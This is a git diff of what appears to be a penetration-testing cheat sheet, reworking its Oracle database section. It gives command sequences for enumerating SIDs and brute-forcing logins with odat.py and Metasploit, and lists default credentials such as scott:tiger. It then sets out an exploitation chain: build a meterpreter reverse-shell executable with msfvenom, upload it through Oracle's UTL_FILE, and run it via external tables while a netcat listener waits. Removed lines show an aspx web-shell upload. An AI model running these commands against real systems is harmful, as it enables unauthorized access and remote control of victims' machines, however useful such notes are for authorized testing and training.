@@ -38,6 +38,9 @@
   - [mysql commands](#mysql_commands)
   - [mssql server config file](#mssql_server_config_file)
 - [ORACLE](#Oracle)
+  - [SIDs enumeration](SIDs-enumeration)
+  - [Brute force credentials](Brute-force-credentials)
+  - [Oracle Exploitation](Exploitation)
 - [NFS](#NFS)
   - [Basic NFS command](#Basic_command)
   - [Create temp folder](#Create_temp_folder)
@@ -411,22 +414,16 @@ for example:
 mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
 ```
 -------------------------------------------------------------------------------------------------------------------------------
-# Oracle
+# Oracle 
 
-## Service on port 1521 
- 
-- Usefull tool set
-- https://www.oracle.com/pl/database/technologies/instant-client/winx64-64-downloads.html
---------------------------------------------------------------------------------------------------------------------------------------------------------------
-## Identify SIDs
+## SIDs enumeration
 
-Identify SIDs via odat.py tool
+- Identify SIDs via odat.py tool
 ```
-apt-get install odat
-odat sidguesser -s <victim_ip>
+python3 odat.py sidguesser -s <victim_ip>
 ```
 
-Valid SID brute forcing via metasploit
+- Identify SIDs via metasploit
 ```
 msf > use auxiliary/admin/oracle/sid_brute 
 msf auxiliary(admin/oracle/sid_brute) > set rhost <victim_ip>
@@ -435,42 +432,38 @@ msf auxiliary(admin/oracle/sid_brute) > run
 
 ## Brute force credentials 
 
-Brute force credentials via metasploit
+- via odat.py
+```
+locate oracle_default_userpass.txt
+
+python3 odat.py passwordguesser -s <victim_ip> -p 1521 -d XE --accounts-file accounts/oracle_default_userpass.txt
+```
+
+- via metasploit
 ```
 msf > use auxiliary/admin/oracle/oracle_login
 msf auxiliary(admin/oracle/oracle_login) > set sid (for example XE)
 msf auxiliary(admin/oracle/oracle_login) > set rhost <victim_ip>
 msf auxiliary(admin/oracle/oracle_login) > run
 ```
-Get credentials with other way
-#TODO!
+Brute force credentials via metasploit
 
-## Check options with odat
-```
-odat all -s <victim_ip> -d XE -U scott -P tiger --sysdba
-```
-**For exmaple search DBMS_XSLPROCESSOR library(this options allows us to put any files onto the machine**
+## Exploitation
 
-## PUT aspx file in the machine
-
-Generate payload
+- Generate payload
 ```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<my_port> -f aspx > rs_file.aspx
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<my_port> -f exe > rs_file.exe
+```
+- upload file
+```
+python3 odat.py utlfile -s <victim_ip> -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp rs_file.exe rs_file.exe
 ```
 
-PUT payload
+- execute file 
 ```
-odat dbmsxslprocessor -s <victim_ip> -d XE -U scott -P tiger --putFile "C://inetpub//wwwroot//" t.aspx /full/path/for/local/aspx/file --sysdba
-
-C://inetpub//wwwroot// : victim path, example for this case
-t.aspx: example shell name
-XE: example SIDs
-```
-## Port 2100
-```
-credentials:
-sys:sys
-scott:tiger
+Run netcat
+ nc -lnvp <your_port>
+python3 odat.py externaltable -s <victim_ip> -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba
 ```
 --------------------------------------------------------------------------------------------------------------------------------------
 # NFS
